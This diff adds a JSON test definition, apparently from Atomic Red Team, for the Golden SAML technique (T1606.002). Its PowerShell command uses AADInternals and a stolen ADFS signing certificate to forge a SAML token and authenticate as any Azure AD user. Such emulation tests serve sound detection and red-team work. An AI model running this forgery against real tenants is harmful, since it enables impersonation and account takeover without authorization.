@@ -1,0 +1,46 @@
+{
+    "name": "Golden SAML",
+    "description": "Forge a Golden SAML token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof).  You will need the ADFS token signing certificate (see T1552.004 to export it). More info here : https://o365blog.com/post/adfs/ ",
+    "supported_platforms": [
+        "azure-ad"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"#{immutable_id}\" -PfxFileName \"#{certificate_path}\" -Issuer \"#{issuer_uri}\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1606.002",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "SAML Tokens",
+    "source": "ART",
+    "uuid": "b16a03bc-1089-4dcc-ad98-30fe8f3a2b31",
+    "arguments": {
+        "certificate_path": {
+            "description": "Token signing certificate path. See T1552.004 to export it",
+            "type": "path",
+            "default": ".\\ADFS_signing.pfx"
+        },
+        "immutable_id": {
+            "description": "ImmutableId of the targeted user. It can be obtained with AzureAD powershell module; $(Get-AzureADUser -SearchString \"username\").ImmutableId",
+            "type": "string",
+            "default": "aehgdqBTZV50DKQZmNJ8mg=="
+        },
+        "issuer_uri": {
+            "description": "Issuer URI of the ADFS service",
+            "type": "string",
+            "default": "http://contoso.com/adfs/services/trust/"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "AADInternals module must be installed.\n",
+            "prereq_command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "Install-Module -Name AADInternals -Force\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
